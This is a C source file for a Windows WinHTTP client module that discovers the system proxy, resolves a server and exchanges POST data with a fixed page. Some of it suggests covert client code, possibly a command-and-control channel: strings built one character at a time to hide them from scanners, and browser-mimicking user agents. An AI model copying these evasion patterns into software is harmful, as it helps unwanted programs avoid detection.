#include <Windows.h>
#include <Winhttp.h>
#include <stdio.h>
#include "win_http.h"

#undef _GLOBAL_VERSION_FUNCTIONS_
#include "version.h"

HINTERNET hGlobalInternet = 0;
HINTERNET hSession = 0;
HINTERNET hConnect = 0;

PBYTE WinHTTPGetResponse(PULONG uOut)
{
	PBYTE pHttpResponseBuffer;

	if (!WinHttpReceiveResponse(hGlobalInternet, NULL))
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] WinHttpReceiveResponse FAIL\n");
#endif
		return (PBYTE)NULL;
	}
	
	ULONG uContentLength;
	WCHAR szContentLength[32];
	ULONG uBufLen = sizeof(szContentLength);
	ULONG uIndex = WINHTTP_NO_HEADER_INDEX;
	if (!WinHttpQueryHeaders(hGlobalInternet, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, &szContentLength, &uBufLen, &uIndex))
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] WinHttpQueryHeaders FAIL\n");
#endif
		return (PBYTE)NULL;
	}

	uContentLength = _wtoi(szContentLength);
	pHttpResponseBuffer = (PBYTE)malloc(uContentLength);
	if (!pHttpResponseBuffer || !uContentLength)
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] Cannot allocate buffer for HTTP response\n");
#endif
		return (PBYTE)NULL;
	}

	ULONG uRead;
	uRead = *uOut = 0;
	do
	{
		if (!WinHttpReadData(hGlobalInternet, pHttpResponseBuffer + *uOut, uContentLength, &uRead))
		{
#ifdef _DEBUG
			OutputDebugString(L"[!!] WinHttpReadData FAIL\n");
#endif
			return (PBYTE)NULL;
		}

		*uOut += uRead;
		uContentLength -= uRead;
	}
	while(uRead && uContentLength);

	return pHttpResponseBuffer;
}

BOOL WinHTTPSendData(PBYTE pBuffer, ULONG uBuffLen)
{
#ifdef _DEBUG
//	PWCHAR pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
//	swprintf_s((wchar_t *)pDebugString, 1024, L"[+] Sending %08x byte of request\n", uBuffLen);
//	OutputDebugString(pDebugString);
//	free(pDebugString);
#endif
	BOOL ret;
	WCHAR strContentLength[] = { L'C', L'o', L'n', L't', L'e', L'n', L't', L'-', L'L', L'e', L'n', L'g', L't', L'h', L':', L' ', L'%', L'd', L'\0' };
	WCHAR pContentLength[1024];
	swprintf_s(pContentLength, 1024, strContentLength, uBuffLen);
	ret = WinHttpSendRequest(hGlobalInternet, 
		pContentLength,
		-1L, 
		pBuffer, 
		uBuffLen, 
		uBuffLen,
		NULL);

	if (!ret)
	{
#ifdef _DEBUG
		PWCHAR pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
		swprintf_s(pDebugString, 1024, L"[!!] WinHttpSendRequest fail: %08x\n", GetLastError());
		OutputDebugString(pDebugString);
		free(pDebugString);
#endif
	}

	return ret;
}

BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG pPortToConnect)
{
	WINHTTP_CURRENT_USER_IE_PROXY_CONFIG pProxyConfig;
	WINHTTP_PROXY_INFO pProxyInfoTemp, pProxyInfo;
	WINHTTP_AUTOPROXY_OPTIONS pOptPAC;
	DWORD dwOptions = 0;
	WCHAR _wHostProto[256];
	WCHAR _wHost[256];
	PBYTE pAddrPtr;
	char *wTypes[] = { "*\x00/\x00*\x00", 0x0 };
	BOOL isProxy = FALSE;

	WCHAR strFormat[] = { L'h', L't', L't', L'p', L':', L'/', L'/', L'%', L'S', L'\0' };
	swprintf_s(_wHost, L"%S", pServerUrl);
	swprintf_s(_wHostProto, strFormat, pServerUrl);
	ZeroMemory(&pProxyInfo, sizeof(pProxyInfo));
	ZeroMemory(&pProxyConfig, sizeof(pProxyConfig));

	// Crea una sessione per winhttp.
	//hSession = WinHttpOpen(L"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
	//hSession = WinHttpOpen(L"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
	//hSession = WinHttpOpen(L"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
	hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);

	// Cerca nel registry le configurazioni del proxy
	if (hSession && WinHttpGetIEProxyConfigForCurrentUser(&pProxyConfig)) 
	{
		if (pProxyConfig.lpszProxy) 
		{
			// Proxy specificato
			pProxyInfo.lpszProxy = pProxyConfig.lpszProxy;
			pProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
			pProxyInfo.lpszProxyBypass = NULL;
		}

		if (pProxyConfig.lpszAutoConfigUrl)
		{
			// Script proxy pac
			pOptPAC.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL;
			pOptPAC.lpszAutoConfigUrl = pProxyConfig.lpszAutoConfigUrl;
			pOptPAC.dwAutoDetectFlags = 0;
			pOptPAC.fAutoLogonIfChallenged = TRUE;
			pOptPAC.lpvReserved = 0;
			pOptPAC.dwReserved = 0;

			if (WinHttpGetProxyForUrl(hSession ,_wHostProto, &pOptPAC, &pProxyInfoTemp))
				memcpy(&pProxyInfo, &pProxyInfoTemp, sizeof(pProxyInfo));
		}

		if (pProxyConfig.fAutoDetect) 
		{
			// Autodetect proxy
			pOptPAC.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT;
			pOptPAC.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
			pOptPAC.fAutoLogonIfChallenged = TRUE;
			pOptPAC.lpszAutoConfigUrl = NULL;
			pOptPAC.lpvReserved = 0;
			pOptPAC.dwReserved = 0;

			if (WinHttpGetProxyForUrl(hSession ,_wHostProto, &pOptPAC, &pProxyInfoTemp))
				memcpy(&pProxyInfo, &pProxyInfoTemp, sizeof(pProxyInfo));
		}

		// Se ha trovato un valore sensato per il proxy, allora ritorna
		if (pProxyInfo.lpszProxy) 
		{
			isProxy = TRUE;
			WinHttpSetOption(hSession, WINHTTP_OPTION_PROXY, &pProxyInfo, sizeof(pProxyInfo));

			// Parsa la stringa per separare la porta
			_snprintf_s((PCHAR)pAddrToConnect, uBufLen, _TRUNCATE, "%S", pProxyInfo.lpszProxy);
			if (pAddrPtr = (PBYTE)strchr((PCHAR)pAddrToConnect, (int)':')) 
			{
				*pAddrPtr = 0;
				pAddrPtr++;
				sscanf_s((PCHAR)pAddrPtr, "%d", pPortToConnect);
			} 
			else
				*pPortToConnect = 8080;

			if (!ResolveName(pAddrToConnect, pAddrToConnect, uBufLen))
			{
				WinHttpCloseHandle(hSession);
#ifdef _DEBUG
				OutputDebugString(L"[!!] Cannot resolve name 1\n");
#endif
				return FALSE;
			}
		}
	}

	if (!isProxy) 
	{
		*pPortToConnect = 80; // se ci stiamo connettendo diretti usiamo di default la porta 80
		if (!ResolveName(pServerUrl, pAddrToConnect, uBufLen))
		{
#ifdef _DEBUG
			OutputDebugString(L"[!!] Cannot resolve name 2\n");
#endif
			return FALSE;
		}
		swprintf_s(_wHost, L"%S", pAddrToConnect); // In questo caso mette nella richiesta winhttp direttamente l'indirizzo IP
	}

#ifdef _DEBUG
	PWCHAR pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
	swprintf_s((wchar_t *)pDebugString, 1024, L"[*] WinHTTPSetup got host: %s, port: %d\n", &_wHost, *pPortToConnect);
	OutputDebugString(pDebugString);
	free(pDebugString);
#endif
	// Definisce il target
	if (!(hConnect = WinHttpConnect(hSession, (LPCWSTR)_wHost, INTERNET_DEFAULT_HTTP_PORT, 0)))
		return FALSE;

	if (!(hGlobalInternet = WinHttpOpenRequest(hConnect, L"POST", POST_PAGE, NULL, WINHTTP_NO_REFERER, (LPCWSTR *) wTypes, 0)))
	  
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] WinHttpOpenRequest FAILED\n");
#endif
		WinHttpCloseHandle(hSession);
		return FALSE;
	}

#ifdef _DEBUG
		OutputDebugString(L"[!!] WinHttpOpenRequest SUCCEEDED\n");
#endif

	if(!WinHttpSetTimeouts(hGlobalInternet, RESOLVE_TIMEOUT, CONNECT_TIMEOUT, SEND_TIMEOUT, RECV_TIMEOUT) == TRUE)
	{
		#ifdef _DEBUG
			OutputDebugString(L"[!!] WinHttpSetTimeouts FAILED\n");
		#endif
	}
	else
	{
		#ifdef _DEBUG
				OutputDebugString(L"[!!] WinHttpSetTimeouts SUCCEEDED\n");
		#endif
	}

	return TRUE;	
}


BOOL ResolveName(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen)
{
	struct hostent *hAddress;
	PBYTE pAddrPtr;
	WORD wVersionRequested;
	WSADATA pWSAData;

#ifdef _DEBUG
	PWCHAR pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
	swprintf_s((wchar_t *)pDebugString, 1024, L"[*] ResolveName resolving: %S\n", pServerUrl);
	OutputDebugString(pDebugString);
	free(pDebugString);
#endif

	// E' gia' un indirizzo IP
	if (inet_addr((PCHAR)pServerUrl) != INADDR_NONE) 
	{
		_snprintf_s((PCHAR)pAddrToConnect, uBufLen, _TRUNCATE, "%s", pServerUrl);
		return TRUE;
	}

	wVersionRequested = MAKEWORD(2, 2);
	if (WSAStartup(wVersionRequested, &pWSAData )!= 0)
	{
#ifdef _DEBUG
		OutputDebugString(L"WSAStartup FAILED\n");
#endif
		return FALSE;
	}

	hAddress = gethostbyname((PCHAR)pServerUrl);
	WSACleanup();

	if (!hAddress || !(pAddrPtr = (PBYTE)inet_ntoa(*(struct in_addr*)hAddress->h_addr)))
	{
#ifdef _DEBUG
		OutputDebugString(L"inet_ntoa or gethostbyname FAILED\n");
#endif
		return FALSE;
	}

	_snprintf_s((PCHAR)pAddrToConnect, uBufLen, _TRUNCATE, "%s", pAddrPtr);

	return TRUE;
}


VOID WinHTTPClose()
{
	if (hSession)
	{
#ifdef _DEBUG
		OutputDebugString(L"[+] Closing hSession\n");
#endif
		WinHttpCloseHandle(hSession);
	}
	hSession = NULL;

	if (hGlobalInternet)
	{
#ifdef _DEBUG
		OutputDebugString(L"[+] Closing hGlobalInternet\n");
#endif
		WinHttpCloseHandle(hGlobalInternet);
	}
	hGlobalInternet = NULL;

	if (hConnect)
	{
#ifdef _DEBUG
		OutputDebugString(L"[+] Closing hConnect\n");
#endif
		WinHttpCloseHandle(hConnect);
	}
	hConnect = NULL;

}